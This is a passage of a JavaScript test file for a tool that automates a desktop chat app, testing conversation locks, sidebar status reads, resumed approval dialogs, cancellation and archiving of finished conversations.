  assert.equal(existsSync(lockFile(context)), false);
});

test('a conversation opened from the sidebar is read again until the view has switched', async () => {
  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, runningPolls: 1, reply: 'done', shownElsewhere: 'Other Chat', openRowLag: 2 });
  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE]);
  assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
  assert.equal(context.fake().opened, 1, 'one press, then reads');
});

test('a kept app lock is freed when the sidebar shows its conversation alone and Idle while another one is on screen', async () => {
  const kept = (context, extra = {}) => writeFileSync(lockFile(context), JSON.stringify({ pid: 999999999, expiresAt: Date.now() + 60 * 60_000, app: true, conversation: 'Gone Task - ws - Antigravity', marker: NONCE, project: 'ws', ...extra }));
  const context = setup({ runningPolls: 1, sidebarRows: { 'Gone Task|ws': ['Idle'] } });
  kept(context);
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success', envelope.warnings.join(' | '));
  const busy = setup({ runningPolls: 1, sidebarRows: { 'Gone Task|ws': ['In Progress'] } });
  kept(busy);
  assert.equal((await run(busy)).envelope.evidence.blocked_reason, 'locked');
  // A lock that did not record its project is left to the screen or the user.
  const unnamed = setup({ runningPolls: 1, sidebarRows: { 'Gone Task|ws': ['Idle'] } });
  kept(unnamed, { project: undefined });
  assert.equal((await run(unnamed)).envelope.evidence.blocked_reason, 'locked');
  // The kept conversation on screen, still running: the sidebar is never asked.
  const running = setup({ runningPolls: 1, earlier: { title: 'Gone Task - ws - Antigravity', running: true, message: OWN }, sidebarRows: { 'Gone Task|ws': ['Idle'] } });
  kept(running);
  assert.equal((await run(running)).envelope.evidence.blocked_reason, 'locked');
  assert.ok(!names(running).includes('sidebar-state'));
});

test('a run whose row leaves the sidebar while it waits ends after 3 reads, and the lock does not stay', async () => {
  const context = settled({ stuck: true, sidebarMissingAfter: 2 });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'error');
  assert.ok(envelope.warnings.some((warning) => /did not list the run's conversation/.test(warning)), JSON.stringify(envelope.warnings));
  const order = names(context);
  assert.ok(!order.slice(order.indexOf('send')).includes('open-row'), 'no row to open');
  // The app was taken back without waiting on its own lock, and Stop went only to its own conversation.
  assert.equal(context.fake().stopped, true);
  assert.equal(existsSync(lockFile(context)), false);
});

test('a cancel while it waits ends within the companion grace even when the row hangs', { skip: process.platform === 'win32' }, async () => {
  const context = settled({ stuck: true, delays: { 'open-row': 30_000 } });
  const { child, done } = start(context);
  while (sidebarReads(context) < 3) await new Promise((resolve) => setTimeout(resolve, 20));
  const signalled = Date.now();
  child.kill('SIGTERM');
  const { envelope } = await done;
  assert.ok(Date.now() - signalled < 18_000, `ended ${Date.now() - signalled} ms after the signal`);
  assert.equal(envelope.status, 'error');
});

test('a sidebar read that fails decides nothing about the end of the turn', async () => {
  const context = setup({ runningPolls: 0, sidebarErrors: 2, reply: 'FINAL' });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success', envelope.warnings.join(' | '));
  const order = names(context);
  assert.ok(order.slice(0, order.indexOf('copy-reply')).filter((name) => name === 'sidebar-state').length >= 3);
});

test('a resumed approval opens its conversation from the sidebar when another one is on screen', async () => {
  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, runningPolls: 1, reply: 'done', shownElsewhere: 'Other Chat' });
  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE]);
  assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
  const order = names(context);
  assert.ok(order.indexOf('open-row') >= 0 && order.indexOf('open-row') < order.indexOf('answer'));
});

test('a sidebar with no status groups keeps the run on screen with the app lock held', async () => {
  const context = settled({ runningPolls: 3, sidebarUngrouped: true });
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success', envelope.warnings.join(' | '));
  assert.ok(!names(context).includes('open-row'));
});

test('a run that finds the app lock held by a live run acting in phases waits for it', async () => {
  const context = setup({ runningPolls: 1 });
  const runs = join(context.stateDir, 'desktop-runs');
  mkdirSync(runs, { recursive: true });
  const holder = spawn(process.execPath, ['-e', 'setTimeout(() => {}, 1500)']);
  writeFileSync(join(runs, 'other.json'), JSON.stringify({ pid: holder.pid, marker: 'other' }));
  writeFileSync(lockFile(context), JSON.stringify({ pid: holder.pid, expiresAt: Date.now() + 60_000, runs: true }));
  const started = Date.now();
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success', envelope.warnings.join(' | '));
  assert.ok(Date.now() - started >= 1_000, 'it waited for the other run');
});

// Archiving finished conversations (finolabs/agybird#62).
test('with archiving on, a finished run archives its own conversation from the sidebar', async () => {
  const context = setup({ runningPolls: 1, reply: 'READY' });
  context.env.AGYBIRD_DESKTOP_ARCHIVE = '1';
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'success', envelope.warnings.join(' | '));
  assert.equal(envelope.evidence.archived, true);
  assert.equal(envelope.evidence.project, 'ws');
  assert.deepEqual(context.fake().archived, ['Fake Task|ws']);
  const order = names(context);
  assert.ok(order.indexOf('archive-row') > order.indexOf('copy-reply'), 'after the reply was read');
  assert.ok(!order.slice(order.indexOf('copy-reply')).includes('front'), 'the app stays behind');
});

test('archiving is off unless asked, and a failed archive only warns', async () => {
  const off = setup({ runningPolls: 1 });
  assert.equal((await run(off)).envelope.evidence.archived, undefined);
  assert.ok(!names(off).includes('archive-row'));
  const failing = setup({ runningPolls: 1, archiveFails: true });
  failing.env.AGYBIRD_DESKTOP_ARCHIVE = '1';
  const { envelope } = await run(failing);
  assert.equal(envelope.status, 'success');
  assert.ok(envelope.warnings.some((warning) => /was not archived in the app/.test(warning)), JSON.stringify(envelope.warnings));
});

test('a run that ends waiting for an answer is not archived', async () => {
  const context = setup({ dialog: DIALOG, runningPolls: 1 });
  context.env.AGYBIRD_DESKTOP_ARCHIVE = '1';
  const { envelope } = await run(context);
  assert.equal(envelope.status, 'needs_permission');
  assert.ok(!names(context).includes('archive-row'));
});

test('--archive-finished archives listed conversations that are alone and Idle, and skips the rest', async () => {
  const context = setup({ sidebarRows: { 'Done|ws': ['Idle'], 'Going|ws': ['In Progress'], 'Twice|ws': ['Idle', 'Idle'] } });
  const items = ['Done', 'Going', 'Twice', 'Gone'].map((name) => ({ title: `${name} - ws - Antigravity`, project: 'ws' }));
  items.push({ title: 'Odd title', project: 'ws' });
  // A run of 0.4.8 recorded no project: the workspace's own project is taken.
  items[0].project = null;
  // A live run has this conversation: it is never archived.
  items.push({ title: 'Busy - ws - Antigravity', project: 'ws' });
  const runs = join(context.stateDir, 'desktop-runs');
  mkdirSync(runs, { recursive: true });
  writeFileSync(join(runs, 'live.json'), JSON.stringify({ pid: process.pid, marker: 'live', title: 'Busy - ws - Antigravity', project: 'ws', app: true }));
  const { envelope } = await run(context, ['--archive-finished'], JSON.stringify(items));
  assert.equal(envelope.status, 'success');
  assert.deepEqual(envelope.archived, [{ title: 'Done - ws - Antigravity', project: 'ws' }]);
  assert.deepEqual(envelope.skipped.map((entry) => entry.reason.split(':')[0]).sort(), ['active_run', 'no conversation title of its project', 'not_found', 'not_idle', 'several_rows']);
  assert.deepEqual(context.fake().archived, ['Done|ws']);
  for (const name of ['front', 'open-row', 'snapshot']) assert.ok(!names(context).includes(name), `no ${name}`);
  assert.equal(existsSync(lockFile(context)), false);
});
